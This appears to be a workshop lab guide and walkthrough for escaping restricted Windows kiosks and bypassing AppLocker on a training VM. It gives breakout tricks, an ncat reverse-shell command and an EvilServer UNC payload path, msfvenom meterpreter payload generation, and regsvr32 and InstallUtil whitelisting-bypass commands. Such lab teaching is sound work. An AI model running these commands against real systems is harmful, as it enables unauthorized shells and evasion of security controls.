# Lab Setup

1. Download a free Windows 10 Virtual Machine.
  * https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
2. Boot the machine and log in as IEUser.
3. Launch PowerShell (Desktop App) as Administrator, execute the "Windows_Breakout_PrivEsc_Setup_v1.2.ps1" script and wait for the machine to reboot!
4. Extract the "DefCon-Tools.zip" archive in "C:\DefCon-Tools".

### Notes

* It is important that the Microsoft VM is used as part of the lab relies on AppLocker which is only available in Windows Professional & Enterprise.
* All user account have their password set to "123" for convenience.
* Both "restricted1" and "kiosk2" have startup scripts which will log the user out after authenticating for the first time. Be patient, allow this to complete!

# Walkthrough

## Got Shell?

### Restricted1

**Breaking out**
a) Right-click on Start button -> File Explorer
b) Windows Button -> type name of program you want to execute

**Solutions**
a) ftp.exe -> !whoami
b) powershell -> whoami
c) powershell_ise -> whoami
d) batch script -> open notepad, type whoami > whoami.txt, run script

### Restricted2

*Can only run notepad*

**Solutions**
a) Copy ftp.exe to desktop -> rename to notepad.exe -> !whoami
b) Copy cmd.exe to desktop -> rename to notepad.exe -> whoami
c) Copy custom shell (ex. React OS) to desktop -> rename to notepad.exe -> whoami

### Kiosk1

*Aka the worst kiosk ever! The main challenge here is getting an explorer window, from there it is trivial to execute anything.*

**Solutions**
a) Sticky Keys: Press Shift 5x -> Press on Link in the popup window
b) Task Manager: CTRL+SHIFT+ESC -> File -> Run New Task
c) Print: Right-click anywhere -> Print -> Find Printer
d) Open new tab -> Right-Click&Translate with Bing -> Or press F1
  * file:///C:/Windows/system32/cmd.exe
e) Developer Tools: Press F12 -> Performance Tab -> Press on 3rd icon "Importing Profile Session"
f) Open menu: Press CTRL+O -> Press Browse

### Kiosk2

*Uses Assigned access to expose a single Windows application to the user. Pretty decent lockdown, lots of mitigations in place, Microsoft made a concerted effort to prevent breakout. However, one thing was overlooked..*

**Solution**
a) Possible to mount UNC path. Even though visibility is restricted to folders, it is possible to execute binaries even with arguments.
  * \\EvilServer\Share\Payload.exe
  * \\127.0.0.1\C$\DefCon-Tools\Tools\ncat.exe -nv 192.168.187.1 443 -e C:\Windows\System32\cmd.exe

### AppLocker1

*Default rules & blocks powershell, cmd, rundll32. This user illustrates AppLocker configuration failures.*

**Solutions**
a) powershell_ise is not blocked.
b) User has a folder which is exempt from AppLocker Policy
  * (Get-AppLockerPolicy -Local).RuleCollections
  * Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse
  * reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\560d03c2-b277-4331-8c59-bc7d4eb08359

### AppLocker2

*Default rules & blocks powershell, powershell_ise, cmd. This user illustrates common AppLocker/SRP bypasses by leveraging trusted binaries.*

**Solutions**
a) Classic rundll32
  * C:\Windows\System32\rundll32.exe C:\DefCon-Tools\SRP\Alternatives\cmd.dll,WhatEver
b) regsvr32
  1) SCT Execution
    Reading Material:
      * http://en.wooyun.io/2016/04/23/Use_SCT_to_Bypass_Application_Whitelisting_Protection.html
      * https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302

    Example:
      * C:\Windows\System32\regsvr32.exe /u /s /i:"C:\DefCon-Tools\SRP\SubTee\Regsvr32-notepad.sct" scrobj.dll

  2) DLL Execution
    Reading Material:
      * http://subt0x10.blogspot.com/2016/06/what-you-probably-didnt-know-about.html

    Example:
      **cmd.dll (ReactOS)**
      * C:\Windows\System32\regsvr32.exe "C:\DefCon-Tools\SRP\Alternatives\cmd.dll"
	  
      **custom dll (with limitations)**
      * C:\Windows\System32\regsvr32.exe C:\DefCon-Tools\SRP\SubTee\Resvr32-CalcNotepad.dll
      * C:\Windows\System32\regsvr32.exe /u C:\DefCon-Tools\SRP\SubTee\Resvr32-CalcNotepad.dll

      **custom dll shellcode**
      * Visual Studio project -> C:\DefCon-Tools\SRP\SubTee\Regsvr32-DLL-ShellCode
      * msfvenom -p windows/meterpreter/reverse_tcp LHOST='192.168.187.132' -f csharp
c) InstallUtil
  1) SubTee POC
    Reading Material:
      * http://subt0x10.blogspot.com/2015/08/application-whitelisting-bypasses-101.html
      * https://gist.github.com/subTee/408d980d88515a539672

    Example:
      * msfvenom -p windows/meterpreter/reverse_tcp LHOST='192.168.187.132' -f csharp
      * C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /unsafe /platform:x86 /out:”C:\DefCon-Tools\SRP\SubTee\InstallUtil-ShellCode.exe” ”C:\DefCon-Tools\SRP\SubTee\InstallUtil-ShellCode.cs”
      * C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U ”C:\DefCon-Tools\SRP\SubTee\InstallUtil-ShellCode.exe”

  2) p0wnedshell
    Reading Material:
      * https://github.com/Cn33liz/p0wnedShell

    Example:
      * **compile:** C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /unsafe /reference:"C:\DefCon-Tools\SRP\SubTee\p0wnedShell\System.Management.Automation.dll" /reference:System.IO.Compression.dll /win32icon:"C:\DefCon-Tools\SRP\SubTee\p0wnedShell\p0wnedShell.ico" /out:"C:\DefCon-Tools\SRP\SubTee\p0wnedShell\p0wnedShellx64.exe" /platform:x64 "C:\DefCon-Tools\SRP\SubTee\p0wnedShell\*.cs"
      * **execute:** C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "C:\DefCon-Tools\SRP\SubTee\p0wnedShell\p0wnedShellx64.exe"